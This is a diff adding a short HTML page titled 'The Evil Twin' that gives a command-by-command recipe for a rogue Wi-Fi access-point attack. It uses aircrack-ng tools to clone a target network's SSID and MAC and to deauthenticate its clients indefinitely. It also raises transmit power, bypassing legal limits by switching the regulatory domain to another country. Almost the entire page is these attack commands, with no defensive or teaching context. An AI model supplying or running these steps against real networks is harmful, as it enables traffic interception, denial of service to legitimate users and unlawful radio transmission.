@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>The Evil Twin</title>
+</head><body>Start airmon<br/>
+&nbsp;&#09;iwconfig<br/>
+&nbsp;&#09;airmon-ng start wlan0<br/>
+Start airdump<br/>
+&nbsp;&#09;airodump-ng mon0<br/>
+Wait for ssid to show <br/>
+Create new AP with same ssid and mac<br/>
+&nbsp;&#09;airbase-ng -a &lt;bssid&gt; --essid &lt;ssid&gt; -c &lt;channel&gt; mon0<br/>
+Deauth your target<br/>
+&nbsp;&#09;aireplay-ng --deauth 0 -a &lt;bssid&gt;<br/>
+Run your AP at max power<br/>
+&nbsp;&#09;iwconfig wlan0 txpower 27 <br/>
+&nbsp;&#09;(27 is max 'legal' power)<br/>
+&nbsp;&#09;Bypass restrictions:<br/>
+&nbsp;&#09;&#09;set to use another domain/country:<ul><li style="list-style-type: none">&nbsp;&#09;&#09;iw reg set BO</li>
+<li style="list-style-type: none">&nbsp;&#09;&#09;iwconfig wlan0 txpower 30</li>
+</ul>
+Wait for connection</body></html>
